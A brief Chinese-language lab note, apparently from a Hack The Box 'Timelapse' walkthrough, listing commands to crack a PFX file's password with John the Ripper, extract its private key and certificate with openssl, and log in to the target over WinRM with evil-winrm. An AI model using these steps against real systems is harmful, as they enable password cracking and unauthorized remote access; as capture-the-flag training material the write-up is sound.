# pfx-enc-key-转储-crt证书登陆

遇到pfx文件

```clike
1. 爆破出密码
/usr/share/john/pfx2john.py legacyy_dev_auth.pfx | tee legacyy_dev_auth.pfx.hash
2. 提取enc
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
3. 提取key
openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
4. 转储得到crt
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
5. 登陆
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```
